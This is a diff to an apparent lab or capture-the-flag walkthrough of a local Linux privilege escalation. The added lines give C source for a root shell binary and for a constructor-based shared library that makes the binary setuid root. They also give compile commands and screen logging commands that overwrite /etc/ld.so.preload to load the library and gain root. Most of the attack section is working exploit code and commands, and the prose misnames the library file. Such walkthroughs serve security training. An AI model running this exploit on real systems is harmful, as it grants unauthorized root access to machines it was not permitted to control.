@@ -143,11 +143,13 @@ done
 
 # ![16](images/test.jpg?raw=true "test")
 
-+ **And the file owner is root. Let's exploit this vulnerability. Firstly, let's create a C program so we can generate a root shell**
++ **And the file owner is root. Let's exploit this vulnerability. First, let's create a C program so we can generate a root shell and compile it. We're gonna create it in the /tmp directory**
 
 ```C
 #include <stdio.h>
 #include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
 
 int main(void)
 {
@@ -162,4 +164,35 @@ int main(void)
 }
 ```
 
+``gcc root_sh.c -o root_sh``
+
++ **We have to make another little thing; if we run the executable, we'll do it as our user. So we need to change the ownership and permission of the file so we can run it as root. To do this, we'll create a dynamic library file and then compile it. Create it into the /tmp directory too.**
+
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+__attribute__ ((__constructor__))
+
+void libshell(void)
+{
+    chown("/tmp/root_sh", 0, 0);
+    chmod("/tmp/root_sh", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] shell loaded!\n");
+}
+```
+
+``gcc -fPIC -shared -ldl /tmp/lib_shell.c -o /tmp/lib_shell.so``
+
++ **What we need to do now is to overwrite the /etc/ld.so.preload file with our shared library** *shell_library.so* **which executes the shell with root privilege. Let's first move into the /etc directory**
+
+``cd /etc``
+``screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib_shell.so"``
+``screen -ls``
+``/tmp/root_sh``
+
+**And we are root!**
 
